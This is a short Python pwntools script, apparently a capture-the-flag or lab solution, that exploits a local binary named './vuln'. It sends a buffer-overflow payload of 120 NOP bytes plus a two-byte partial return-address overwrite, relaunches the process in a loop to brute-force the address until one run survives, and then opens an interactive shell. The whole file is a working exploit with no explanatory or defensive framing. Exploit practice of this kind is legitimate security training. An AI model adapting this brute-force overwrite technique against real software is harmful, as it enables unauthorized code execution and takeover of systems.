#!/bin/python3

from pwn import p16, process, context
from sys import argv

def main():

    ## default silent 
    if "-v" not in argv:
        context.log_level = 100

    print("wait..")

    ## create payload
    payload = b"\x90"*120 
    payload += p16(0x0189)          # fixed offset

    ## brute force!
    tries = 0
    while True:

        ## start process
        target = process("./vuln")

        ## send payload
        target.send(payload)

        ## check if live 
        target.clean()
        try:
            target.recv(timeout=1)
        except EOFError:
            tries += 1
            print(f"Tries: {tries}", end='\r')
            continue

        ## got shell
        target.interactive()
        return


if __name__ == "__main__":
    main()

